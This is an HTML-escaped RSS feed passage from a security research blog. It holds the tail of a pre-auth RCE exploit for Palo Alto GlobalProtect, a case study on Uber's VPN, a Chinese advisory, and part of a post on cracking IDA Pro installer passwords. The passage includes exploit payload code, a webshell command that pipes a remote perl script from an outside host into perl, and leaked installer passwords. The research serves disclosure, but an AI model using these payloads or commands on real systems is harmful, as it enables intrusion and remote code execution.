&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;user-email=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the modification is done, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; becomes our webshell and we can execute commands via:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=curl orange.tw/bc.pl | perl -&apos;&lt;/span&gt; https://global-protect/sslmgr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We have reported this bug to Palo Alto via the &lt;a href=&quot;https://securityadvisories.paloaltonetworks.com/Report&quot;&gt;report form&lt;/a&gt;. However, we got the following reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hello Orange,&lt;/p&gt;

  &lt;p&gt;Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.&lt;/p&gt;

  &lt;p&gt;Kind regards&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!&lt;/p&gt;

&lt;h2 id=&quot;the-case-study&quot;&gt;The case study&lt;/h2&gt;

&lt;p&gt;After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vpn.awscorp.uberinternal.com&lt;/code&gt; as an example!&lt;/p&gt;

&lt;p&gt;From the domain name, we guess Uber uses the BYOL from &lt;a href=&quot;https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&amp;amp;sr=0-1&amp;amp;ref_=srh_res_product_title&quot;&gt;AWS Marketplace&lt;/a&gt;. From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;8.0.3&lt;/li&gt;
  &lt;li&gt;8.0.6&lt;/li&gt;
  &lt;li&gt;8.0.8&lt;/li&gt;
  &lt;li&gt;8.0.9&lt;/li&gt;
  &lt;li&gt;8.1.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, we figured out the version, itâ€™s 8.0.6 and we got the shell back!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190717/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hey @orange â€” we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.&lt;/p&gt;

  &lt;p&gt;Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Itâ€™s a fair decision. Itâ€™s always a great time communicating with Uber and report to their &lt;a href=&quot;https://hackerone.com/uber&quot;&gt;bug bounty program&lt;/a&gt;. We donâ€™t care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/</link>
                <guid>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Palo Alto GlobalProtect è³‡å®‰é€šå ±</title>
                <description>&lt;h3 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h3&gt;

&lt;p&gt;åœ¨æˆ‘å€‘é€²è¡Œ&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/a&gt;çš„éç¨‹ä¸­ï¼Œç™¼ç¾ç›®æ¨™ä½¿ç”¨çš„ Palo Alto GlobalProtect å­˜åœ¨ format string å¼±é»ï¼Œé€éæ­¤å¼±é»å¯æ§åˆ¶è©² SSL VPN ä¼ºæœå™¨ï¼Œä¸¦è—‰æ­¤é€²å…¥ä¼æ¥­å…§ç¶²ã€‚&lt;/p&gt;

&lt;p&gt;å›å ±åŸå» å¾Œï¼Œå¾—çŸ¥é€™æ˜¯å€‹å·²çŸ¥å¼±é»ä¸¦ä¸”å·²ç¶“ silent-fix äº†ï¼Œæ‰€ä»¥ä¸¦æœªæœ‰ CVE ç·¨è™Ÿã€‚ç¶“éæˆ‘å€‘åˆ†æï¼Œå­˜åœ¨é¢¨éšªçš„ç‰ˆæœ¬å¦‚ä¸‹ï¼Œå»ºè­°ç”¨æˆ¶å„˜é€Ÿæ›´æ–°è‡³æœ€æ–°ç‰ˆä»¥é¿å…é­å—æ”»æ“Šã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;9.x å’Œ 7.0.x ä¸¦æ²’æœ‰å­˜åœ¨é¢¨éšªã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿåˆ©ç”¨äº†é€™å€‹å¼±é»æˆåŠŸæ§åˆ¶äº† Uber çš„ VPN ä¼ºæœå™¨ï¼Œè©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š
&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;é€™å°‡æœƒæ˜¯æˆ‘å€‘ SSL VPN ç ”ç©¶çš„ç³»åˆ—æ–‡ï¼Œé è¨ˆæœƒæœ‰ä¸‰ç¯‡ã€‚é€™ä¹Ÿæ˜¯æˆ‘å€‘ç ”ç©¶åœ˜éšŠä»Šå¹´åœ¨ &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; å’Œ &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; çš„æ¼”è¬›ã€ &lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt; ã€ä¸­çš„ä¸€å°éƒ¨åˆ†ï¼Œæ•¬è«‹æœŸå¾…ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/</link>
                <guid>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ç ´å¯†è¡Œå‹•: ä»¥ä¸å°‹å¸¸çš„è§’åº¦ç ´è§£ IDA Pro å½éš¨æ©Ÿæ•¸</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;Hex-Rays IDA Pro æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€çŸ¥åçš„åçµ„è­¯å·¥å…·ï¼Œä»Šå¤©æˆ‘å€‘æƒ³ä¾†èŠèŠå®ƒçš„å®‰è£å¯†ç¢¼ã€‚ä»€éº¼æ˜¯å®‰è£å¯†ç¢¼ï¼Ÿä¸€èˆ¬ä¾†èªªï¼Œåœ¨å®Œæˆ IDA Pro è³¼è²·æµç¨‹å¾Œï¼Œæœƒæ”¶åˆ°ä¸€å€‹å®¢è£½åŒ–å®‰è£æª”åŠå®‰è£å¯†ç¢¼ï¼Œåœ¨ç¨‹å¼å®‰è£éç¨‹ä¸­ï¼Œæœƒéœ€è¦é‚£çµ„å®‰è£å¯†ç¢¼æ‰å¾—ä»¥ç¹¼çºŒå®‰è£ã€‚é‚£éº¼ï¼Œå¦‚æœä»Šå¤©åœ¨ç¶²è·¯ä¸Šç™¼ç¾ä¸€åŒ…æ´©æ¼çš„ IDA Pro å®‰è£æª”ï¼Œæˆ‘å€‘æœ‰å¯èƒ½åœ¨ä¸çŸ¥é“å¯†ç¢¼çš„ç‹€æ³ä¸‹é †åˆ©å®‰è£å—ï¼Ÿé€™æ˜¯ä¸€å€‹æœ‰è¶£çš„é–‹æ”¾æ€§å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;åœ¨æˆ‘å€‘åœ˜éšŠæˆå“¡è…¦åŠ›æ¿€ç›ªä¸‹ï¼Œçµ¦å‡ºäº†ä¸€å€‹é©—è­‰æ€§çš„ç­”æ¡ˆï¼šæ˜¯çš„ï¼Œåœ¨æœ‰ Linux æˆ– MacOS ç‰ˆå®‰è£æª”çš„ç‹€æ³ä¸‹ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥æ‰¾åˆ°æ­£ç¢ºçš„å®‰è£å¯†ç¢¼ï¼›è€Œåœ¨æœ‰ Windows ç‰ˆå®‰è£æª”çš„ç‹€æ³ä¸‹ï¼Œæˆ‘å€‘åªéœ€è¦ååˆ†é˜å°±å¯ç®—å‡ºå®‰è£å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹é¢å°±æ˜¯æˆ‘å€‘çš„é©—è­‰æµç¨‹ï¼š&lt;/p&gt;

&lt;h3 id=&quot;-linux-ä»¥åŠ-macos-ç‰ˆ&quot;&gt;* Linux ä»¥åŠ MacOS ç‰ˆ&lt;/h3&gt;

&lt;p&gt;æœ€å…ˆé©—è­‰æˆåŠŸçš„æ˜¯ Linux åŠ MacOS ç‰ˆï¼Œé€™å…©å€‹ç‰ˆæœ¬éƒ½æ˜¯é€é InstallBuilder å°è£æˆå®‰è£æª”ã€‚æˆ‘å€‘å˜—è©¦åŸ·è¡Œå®‰è£ç¨‹å¼ï¼Œä¸¦åœ¨è¨˜æ†¶é«”ä¸­ç›´æ¥ç™¼ç¾äº†æœªåŠ å¯†çš„å®‰è£å¯†ç¢¼ã€‚ä»»å‹™é”æˆï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€é Hex-Rays å”åŠ©å›å ±å¾Œï¼Œ&lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; ä¹Ÿåœ¨ 2019/02/11 é‡‹å‡ºäº† InstallBuilder 19.2.0ï¼ŒåŠ å¼·äº†å®‰è£å¯†ç¢¼çš„ä¿è­·ã€‚&lt;/p&gt;

&lt;h3 id=&quot;-windows-ç‰ˆ&quot;&gt;* Windows ç‰ˆ&lt;/h3&gt;

&lt;p&gt;åœ¨ Windows ç‰ˆä¸Šè§£æ±ºé€™å€‹å•é¡Œæ˜¯é …æŒ‘æˆ°ï¼Œå› ç‚ºé€™å€‹å®‰è£æª”æ˜¯é€é &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt; å°è£çš„ï¼Œå…¶å®‰è£å¯†ç¢¼æ˜¯æ¡ç”¨ &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt; çš„æ–¹å¼å„²å­˜ï¼Œå› æ­¤æˆ‘å€‘ç„¡æ³•é€ééœæ…‹ã€å‹•æ…‹ç¨‹å¼åˆ†æç›´æ¥å–å¾—å¯†ç¢¼ï¼Œé€éæš´åŠ›åˆ—èˆ‰ä¹Ÿä¸æ˜¯ä¸€å€‹æœ‰æ•ˆç‡çš„æ–¹å¼ã€‚ä¸éï¼Œå¦‚æœæˆ‘å€‘æŒæ¡äº†ç”¢ç”Ÿå¯†ç¢¼çš„æ–¹å¼ï¼Œé‚£çµæœå¯èƒ½å°±ä¸ä¸€æ¨£äº†ï¼Œæˆ‘å€‘ä¹Ÿè¨±å¯ä»¥æ›´æœ‰æ•ˆç‡çš„çª®èˆ‰ã€‚&lt;/p&gt;

&lt;p&gt;é›–ç„¶æˆ‘å€‘å·²ç¶“æœ‰äº†æ–¹å‘æ˜¯è¦æ‰¾å‡º Hex-Rays å¦‚ä½•ç”¢ç”Ÿå¯†ç¢¼ï¼Œä½†è¦å»é©—è­‰å»æ˜¯â€éå¸¸å›°é›£â€çš„ã€‚å› ç‚ºæˆ‘å€‘ä¸çŸ¥é“äº‚æ•¸ç”¢ç”Ÿå™¨æ˜¯ç”¨ä»€éº¼èªè¨€å¯¦ä½œçš„ï¼Œè€Œç›®å‰å·²çŸ¥è‡³å°‘æœ‰ &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 ç¨®äº‚æ•¸ç”¢ç”Ÿå™¨&lt;/a&gt;ï¼Œç¨®é¡å¤ªå¤šäº†ã€‚åŒæ™‚ï¼Œæˆ‘å€‘ä¹Ÿç„¡æ³•çŸ¥é“äº‚æ•¸ç”¢ç”Ÿå™¨æ‰€ä½¿ç”¨çš„å­—å…ƒçµ„å’Œå­—å…ƒé †åºæ˜¯ä»€éº¼ã€‚&lt;/p&gt;

&lt;p&gt;è¦æ‰¾å‡ºäº‚æ•¸ç”¢ç”Ÿå™¨æ‰€ä½¿ç”¨çš„å­—å…ƒçµ„æ˜¯çœ¾å¤šå›°é›£äº‹ä¸­æ¯”è¼ƒç°¡å–®çš„ä¸€ä»¶ï¼Œé¦–å…ˆï¼Œæˆ‘å€‘ç«­ç›¡æ‰€èƒ½çš„æ”¶é›†æ‰€æœ‰ IDA Pro çš„å®‰è£å¯†ç¢¼ï¼Œä¾‹å¦‚ WikiLeaks æ‰€æ­éœ²çš„ hackingteam ä½¿ç”¨ä¹‹å¯†ç¢¼ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¾æ‰€æœ‰æ”¶é›†åˆ°çš„å®‰è£å¯†ç¢¼ä¸­æˆ‘å€‘æ•´ç†å‡ºæ‰€ç”¨åˆ°çš„å­—å…ƒçµ„ï¼š
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;å°‘äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; å­—å…ƒï¼Œæ¨æ¸¬é€™äº›éƒ½æ˜¯å®¹æ˜“æ··æ·†çš„å­—å…ƒï¼Œå› æ­¤ä¸æ”¾å…¥å¯†ç¢¼å­—å…ƒçµ„ä¸­æ˜¯åˆç†çš„ã€‚æ¥è‘—ï¼Œæˆ‘å€‘ç”¨é€™äº›å­—å…ƒçµ„ï¼ŒçŒœæ¸¬å¯èƒ½çš„æ’åˆ—é †åºï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœ€å¾Œï¼Œæˆ‘å€‘æŒ‘é¸å¹¾å€‹æ¯”è¼ƒå¸¸è¦‹çš„èªè¨€ï¼ˆc/php/python/perlï¼‰ä¸¦ä½¿ç”¨ä¸Šè¿°çš„å­—å…ƒçµ„å¯¦ä½œäº‚æ•¸ç”¢ç”Ÿå™¨ï¼Œåˆ—èˆ‰æ‰€æœ‰äº‚æ•¸çµ„åˆï¼Œçœ‹çœ‹æˆ‘å€‘æ”¶é›†åˆ°çš„å®‰è£å¯†ç¢¼æœ‰æ²’æœ‰å‡ºç¾åœ¨é€™äº›çµ„åˆä¸­ã€‚ä¾‹å¦‚æˆ‘å€‘ç”¨ä¸‹é¢ç¨‹å¼ç¢¼åˆ—èˆ‰ C èªè¨€çš„äº‚æ•¸çµ„åˆï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
